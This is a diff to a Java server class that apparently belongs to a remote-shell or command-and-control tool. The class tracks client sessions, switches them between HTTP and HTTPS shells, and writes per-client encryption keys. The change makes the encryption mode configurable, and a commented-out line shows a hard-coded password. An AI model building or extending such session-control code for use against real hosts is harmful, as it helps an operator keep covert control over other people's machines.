@@ -80,11 +80,12 @@ public class Server implements Runnable{
     public static HashMap<Integer, String> sessIpSt = new HashMap<>();
     public HashMap<Integer, String> sessIp = sessIpSt;
 
-    public static volatile HashMap<Integer, Encri> clientEnc = new HashMap<>();
+    public static HashMap<Integer, Encri> clientEnc = new HashMap<>();
 
     //public static AES initEncri = new AES("lol123", "lol123");
     public static RSA initEncri = new RSA();
 
+    private Configuration configuration;
 
 
     Logger logger = LogManager.getLogger(getClass());
@@ -92,9 +93,10 @@ public class Server implements Runnable{
 
 
 
-    public Server(String ip, int port, String pass, String salt, ThreadMonitor monitor, int sessionNumber, boolean loaded) throws NoSuchAlgorithmException, InvalidKeySpecException, IOException {
+    public Server(String ip, int port, String pass, String salt, ThreadMonitor monitor, int sessionNumber, boolean loaded, Configuration configuration) throws NoSuchAlgorithmException, InvalidKeySpecException, IOException {
         this.sessionNumber = sessionNumber;
         this.sessionNumberStart = sessionNumber;
+        this.configuration = configuration;
         
         this.threadMonitor = monitor;
 
@@ -118,7 +120,7 @@ public class Server implements Runnable{
         updater = new Updater(ip, port, initEncri);
 
         try {
-            updater.generateOutputStringRSA();
+            updater.generateOutputString(configuration.getEncMode());
             if(updater.writeOut("initialRSA")) {
                 logger.debug("File initialRSA wrote!");
                 return true;
@@ -166,7 +168,7 @@ public class Server implements Runnable{
                                     int port = Integer.parseInt(bufferedReader.readLine());
                                     httpShell = new HTTPShell(key, iv, port, sessionNumber);
                                     updater.setShellType("HTTP", String.valueOf(httpShell.getPort()));
-                                    updater.generateOutputString();
+                                    updater.generateOutputString(clientEnc.get(sessionNumber).getEncryption());
                                     updater.writeOut(getUUID(sessionNumber));
                                     getInteraction(sessionNumber).sendCommand("httpSw");
                                     setInteraction(sessionNumber, httpShell);
@@ -180,7 +182,7 @@ public class Server implements Runnable{
                                     httpsShell = new HTTPSShell(key, iv, portIn);
                                     httpsShell.fireUp(portIn);
                                     updater.setShellType("HTTPS", String.valueOf(getInteraction(sessionNumber).getPort()));
-                                    updater.generateOutputString();
+                                    updater.generateOutputString(clientEnc.get(sessionNumber).getEncryption());
                                     updater.writeOut(getUUID(sessionNumber));
                                     getInteraction(sessionNumber).sendCommand("httpsSw");
                                     setInteraction(sessionNumber, httpsShell);
@@ -327,7 +329,7 @@ public class Server implements Runnable{
     public void addSession(String ip, int port, Interaction handler, int sessionNumber ) {
         sessionHandlers.put(sessionNumber, handler);
         sessIpSt.put(sessionNumber, ip);
-        setNewEncryption(EncMode.RSA, sessionNumber);
+        setNewEncryption(configuration.getEncMode(), sessionNumber);
         
         //handlerinos.put(sessionNumber, handler);
     }
@@ -505,7 +507,9 @@ public class Server implements Runnable{
         String uuid = sessNumUUIDSatic.get(sessionNumber);
         initEncri.generateClientKeyPair(uuid);
         try {
-            updater.generateOutputStringRSA(initEncri.getClientPrivKey(uuid), initEncri.getClientPubKey(uuid));
+            updater.setPrivKey(initEncri.getClientPrivKey(uuid));
+            updater.setPubKey(initEncri.getClientPubKey(uuid));
+            updater.generateOutputString(configuration.getEncMode());
             updater.writeOut(uuid);
         } catch (IOException e) {
             e.printStackTrace();
